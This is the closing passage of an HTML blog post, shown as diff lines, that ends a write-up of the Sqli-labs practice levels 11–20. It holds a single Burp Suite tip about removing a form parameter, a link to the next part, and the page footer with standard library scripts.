+<p>那么只需要在<code>Burpsuits</code>中将<code>&amp;submit=Submit</code>删除掉就可以了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/10-3.png" alt="10-3"></p>
+<p>其余的语句自行补充，不再赘述</p>
+<hr>
+<h3 id="至此，11-20关的Write-up结束"><a href="#至此，11-20关的Write-up结束" class="headerlink" title="至此，11-20关的Write-up结束"></a>至此，11-20关的Write-up结束</h3><h3 id="后一部分链接：第21-30关Write-up"><a href="#后一部分链接：第21-30关Write-up" class="headerlink" title="后一部分链接：第21-30关Write-up"></a>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/31/Sqli-labs%20%E7%AC%AC21-30%E5%85%B3/">第21-30关Write-up</a></h3>
+
+                
+            </div>
+
+            <!-- Comments -->
+            
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    
+
+
+                </div>
+            
+        </div>
+    </div>
+</article>
+
+    <!-- Footer -->
+    <hr>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+
+                    
+
+                    
+                        <li>
+                            <a href="https://github.com/Knlvre" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+
+                    
+                </ul>
+                <p class="copyright text-muted">&copy; 2019 Huang-ShuWei(Knlvre)<br></p>
+                <p class="copyright text-muted"> Theme by <a href="http://startbootstrap.com/template-overviews/clean-blog/" target="_blank"> Clean Blog </a> from <a href="http://startbootstrap.com/" target="_blank"> Start Bootstrap </a> re-Ported by <a href="https://github.com/Knlvre" target="_blank"> Knlvre </a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
